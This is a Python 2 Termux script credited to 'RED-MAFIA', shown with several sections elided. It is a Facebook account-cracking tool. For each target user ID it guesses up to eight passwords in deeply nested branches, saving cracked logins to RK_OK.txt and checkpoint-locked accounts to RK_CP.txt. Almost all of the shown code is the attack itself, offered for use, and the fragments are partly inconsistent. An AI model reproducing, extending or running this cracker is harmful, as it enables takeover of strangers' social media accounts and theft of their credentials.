# Author : RED-MAFIA
# Lang used : python2
# Github : github.com/Red-Mafia
# Don't try to modify this script. if you are are coder the make your own...
# You dont become a programmer by chnging Authors name
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Red-Mafia'
__copyright = 'All rights reserved . Copyright  Red-Mafia'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/zulfiqari')
except OSError:
    pass
...
def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80RED-MAFIA\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80RED-MAFIA\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80RED-MAFIA\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        ...
        print ''
        a_s()
    print ' Total RED-MAFIA: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m Process Has Been Started '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mKING Of Facebook RED-MAFIA\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                ok = open('/sdcard/RK/RK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass1
                cp = open('RK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass2
                    cp = open('RK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass3
                        cp = open('RK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass4
                            cp = open('RK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass5
                                cp = open('RK_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass6
                                    cp = open('RK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[RK-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/RK/RK_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass7
                                        cp = open('RK_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[RK-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/RK/RK_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[RK-CP] ' + uid + ' | ' + pass8
                                            cp = open('RK_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
